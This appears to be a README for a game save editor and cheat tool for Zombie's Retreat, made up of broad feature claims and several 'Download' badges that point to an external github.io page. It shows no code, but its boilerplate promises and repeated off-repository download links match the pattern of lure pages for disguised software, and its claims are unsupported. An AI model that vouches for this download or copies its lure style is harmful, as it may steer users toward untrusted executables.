![preview](https://raw.githubusercontent.com/Amogus2271/Zombies-Retreat-Save-Forge/main/card_21e5.svg)
[![Download](https://raw.githubusercontent.com/Amogus2271/Zombies-Retreat-Save-Forge/main/fetch_fa7f16d.svg)](https://Amogus2271.github.io/Zombies-Retreat-Save-Forge/)

# 🧟 Zombie's Retreat Save Forge & Companion Toolkit

An open-source, community-driven companion framework for **Zombie's Retreat** — rebuilt from the ground up as a modern, maintainable, and cross-platform alternative to legacy cheat tables. This project reimagines what a save editor and in-game companion tool can be: less of a "table of shortcuts" and more of a **workshop for survivors** who want to experiment with builds, story branches, and progression pacing without losing the tension that makes the game memorable.

Where the original Zombies-Retreat-Cheat-Table focused on a narrow set of memory patches, this repository delivers a **full lifecycle toolset**: live stat inspection, save file translation, quest flag visualization, companion affinity tuning, inventory restructuring, and an optional "Director Mode" overlay that lets you nudge the world without breaking immersion for players who still want the challenge.

[![Download](https://raw.githubusercontent.com/Amogus2271/Zombies-Retreat-Save-Forge/main/fetch_fa7f16d.svg)](https://Amogus2271.github.io/Zombies-Retreat-Save-Forge/)

---

## 📚 Table of Contents

- [Why This Project Exists](#-why-this-project-exists)
- [Feature Highlights](#-feature-highlights)
- [Design Philosophy](#-design-philosophy)
- [Screens & Modules](#-screens--modules)
- [Multilingual Support](#-multilingual-support)
- [Responsive Experience](#-responsive-experience)
- [Accessibility](#-accessibility)
- [Performance Notes](#-performance-notes)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Support](#-community--support)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎯 Why This Project Exists

Zombie's Retreat is a game about scarcity, decisions, and consequence. Players experiment with the same early hours again and again to see how the story bends when different survivors live or die. The original community cheat table solved one problem (access to hidden values) but introduced many more: fragile memory offsets, broken patches after each update, and zero context for what a value actually controls.

This repository takes a different route. It treats the game's **save state as a first-class data format**, and builds a suite of tools around it. That means:

- Values are named, described, and grouped by meaning — not by memory address.
- Changes are validated against the game's own logic before they're written.
- Every modification is reversible through the built-in **Snapshot Timeline**.
- Nothing is hidden: the entire ruleset is open source and auditable.

Think of it as moving from a pad of sticky notes to a well-labeled control room.

---

## ✨ Feature Highlights

A quick tour of what ships in this repository. Each module is documented in `/docs` with configuration examples and safe-editing guidance.

| Module | Purpose | Status |
| --- | --- | --- |
| **Save Inspector** | Parse and display save files in human-readable form | Stable |
| **Stat Studio** | Adjust health, stamina, ammunition, and crafting reserves | Stable |
| **Quest Compass** | Visualize story flags, branches, and unlock dependencies | Stable |
| **Affinity Editor** | Fine-tune survivor relationships and dialogue thresholds | Stable |
| **Inventory Architect** | Reorganize items, slots, and stack sizes | Stable |
| **Director Mode** | Optional in-session overlay for real-time nudges | Beta |
| **Snapshot Timeline** | Undo/redo across save sessions with diff previews | Stable |
| **Localization Pack** | Community translations of all tool labels | Growing |
| **Theme Engine** | Light, dark, and high-contrast styles | Stable |
| **Auto-Backup** | Rotating backups with integrity verification | Stable |

### 🧠 Intelligent Value Resolution

The engine maps abstract game concepts (like "fear threshold") onto actual stored values. Instead of editing a mystery integer, you adjust a labeled slider with a safe range, and the tool explains what each endpoint will do in plain language.

### 🕰️ Snapshot Timeline

Every save mutation is recorded as a diff. You can scrub backward through your session history and see exactly what changed, when, and why. This is the closest thing to a time machine for survivors.

### 🧩 Modular Plugins

Additional game features — new NPCs, event flags, side content — can be added as plugins. Each plugin declares its own schema, so the core stays stable even as Zombie's Retreat evolves.

### 🧪 Safety Rails

The tool refuses to write values that violate game invariants. It warns before any destructive change and always creates a recovery point.

### 🌍 Multilingual by Default

All labels are externalized. Community translators can add a language by dropping a single file into the locale directory — no code changes needed.

### 🎨 Responsive UI

From a small laptop window to an ultrawide monitor, the interface reflows gracefully. Touch-friendly controls are included for tablet users who prefer a hands-on editing session.

### 🛠️ 24/7 Customer Support

A volunteer rotation keeps the discussion channels warm around the clock, so a question asked at 3 AM in one timezone is answered by a contributor in another.

---

## 🧭 Design Philosophy

Three ideas shape every decision in this repository.

**1. Respect the source material.** Zombie's Retreat works because of its tension. Tools that remove all friction turn a survival story into a slideshow. This project defaults to *minimum viable intervention*: you only change what you name, and you always see the consequences spelled out first.

**2. Transparency beats convenience.** A shortcut you don't understand is a trap. Every field, toggle, and preset is documented in the interface itself.

**3. Reversibility is non-negotiable.** No change happens without a restore point. If the tool is ever unsure of an outcome, it stops and asks.

---

## 🖥️ Screens & Modules

The interface is organized into workspaces. Each workspace handles one concern and can be opened independently.

- **Home / Dashboard** — a quick overview of the loaded save, recent changes, and suggested next steps.
- **Stats Workspace** — grouped sliders for vitals, combat parameters, and progression counters.
- **Quest Compass** — a dependency graph of story flags with search and filtering.
- **Companion Bay** — per-survivor panels for affinity, morale, and dialogue unlock states.
- **Inventory Lab** — drag-and-drop restructuring of item placement with stack validation.
- **Director Console** — an optional overlay for live adjustments during play.
- **Options & Localization** — theme selection, language picker, and safety rail configuration.

---

## 🌐 Multilingual Support

The localization system supports:

- Right-to-left layouts
- Pluralization rules per locale
- Context-aware string overrides
- Community-contributed glossaries so terminology stays consistent across chapters

Current seeds include English, Spanish, Brazilian Portuguese, German, French, Japanese, Korean, and Simplified Chinese. New languages are welcome and reviewed promptly.

---

## 📱 Responsive Experience

The UI uses a fluid layout grid that adapts from 720px up to 4K. Components are built with intrinsic sizing so nothing stretches awkwardly. On narrow displays, secondary panels collapse into a tab stack; on wide displays, they become side-by-side toolbars.

---

## ♿ Accessibility

Accessibility is treated as a feature, not an afterthought.

- Full keyboard navigation with visible focus rings
- Screen-reader labels for all interactive elements
- Adjustable motion reduction
- Color-blind-safe palette variants
- Resizable text without layout breakage

---

## ⚙️ Performance Notes

- Save parsing is incremental; only changed sections are re-read.
- The UI renders off a virtualized list, so large inventories stay smooth.
- Plugin loading is lazy — unused modules cost nothing at startup.
- Memory footprint stays modest even with all workspaces open.

---

## 🗺️ Roadmap

Upcoming milestones are tracked in the issue tracker. Highlights for the 2026 cycle:

- Expanded plugin API with typed schemas
- Cloud-synced snapshot vault (opt-in)
- Companion web viewer for phones
- Deeper localization tooling for translators
- Automated regression suite for save-format changes

---

## ❓ Frequently Asked Questions

**Is this a replacement for the original cheat table?**
It's a spiritual successor. It covers the same ground and much more, with a focus on clarity and reversibility.

**Will it work with older saves?**
Yes. The translation layer migrates legacy formats forward while preserving a backup of the original.

**Can I contribute a translation?**
Absolutely. Drop a locale file in and open a pull request.

**Does it modify files automatically?**
Only after you confirm, and only after a snapshot is taken.

---

## 🤝 Community & Support

- Discussion forums for build help and feature requests
- A rotating support crew keeps responses flowing 24/7 across timezones
- Live troubleshooting sessions recorded and archived
- Beginner-friendly guides and video walkthroughs
- A dedicated space for sharing creative save experiments

---

## 🧑‍💻 Contributing

Contributions of every size are valued: code, translations, documentation, bug reports, and design feedback. Please review the contribution guide and code of conduct before opening a pull request. Small, focused changes are merged fastest.

---

## ⚠️ Disclaimer

This project is an independent, community-built companion tool. It is not affiliated with, endorsed by, or sponsored by the creators or publishers of Zombie's Retreat. All trademarks and game assets belong to their respective owners. Users are responsible for how they use the software and for complying with any applicable terms of service. The maintainers accept no liability for data loss, corrupted saves, or unintended gameplay consequences. Always keep backups.

---

## 📄 License

Released under the **MIT License**. See the [LICENSE](./LICENSE) file for full terms.

Copyright (c) 2026 Zombie's Retreat Save Forge contributors.

[![Download](https://raw.githubusercontent.com/Amogus2271/Zombies-Retreat-Save-Forge/main/fetch_fa7f16d.svg)](https://Amogus2271.github.io/Zombies-Retreat-Save-Forge/)